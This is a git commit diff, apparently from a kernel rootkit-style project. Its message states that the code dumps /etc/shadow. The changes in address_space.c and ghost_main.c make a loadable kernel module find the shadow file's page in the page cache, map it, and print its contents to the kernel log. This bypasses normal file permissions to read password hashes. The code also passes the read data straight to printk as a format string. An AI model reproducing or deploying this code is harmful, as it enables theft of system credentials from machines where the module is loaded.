83626dd0d9806f2b21e4762dd863b92e9114fa78
mineo333 <sharadawsomeness@gmail.com>
2021-09-16 20:59:23 -0700

    This code dumps /etc/shadow

--- address_space.c
+++ address_space.c
@@ -5,14 +5,14 @@ struct page* find_page(struct file* f, int bs_off){
   struct address_space* mapping = f->f_mapping;
   struct xarray i_pages = mapping -> i_pages;
   int pg_off = bs_off/4096; //integer division to get
-  struct page* page_ptr = xa_load(&i_pages, 0);
+  struct page* page_ptr = xa_load(&i_pages, pg_off);
   if(!page_ptr){
     printk("It didn't work\n");
   }else{
     printk("It worked!\n");
   }
 
-  return NULL;
+  return page_ptr;
 }
 
 void edit_page(char* buf, int off, struct page* page){
--- ghost_main.c
+++ ghost_main.c
@@ -7,10 +7,23 @@
 
 int init_module(void)
 {
-
+ 	char* map;
+	char* buf = kmalloc(1000, GFP_KERNEL);
 	struct file* filp = wait_fd("shadow", 6);
-	find_page(filp, 0);
+	struct page* page = find_page(filp, 0);
+
 	printk("%s\n", get_file_name(filp));
+	if(page){
+		map = kmap(page);
+    memcpy(buf, map, 1000);
+    printk(buf);
+    kunmap(map);
+	}else{
+    printk("It didn't work");
+  }
+
+	kfree(buf);
+
 //	wait_task("passwd", 6);
 
 	return 0;
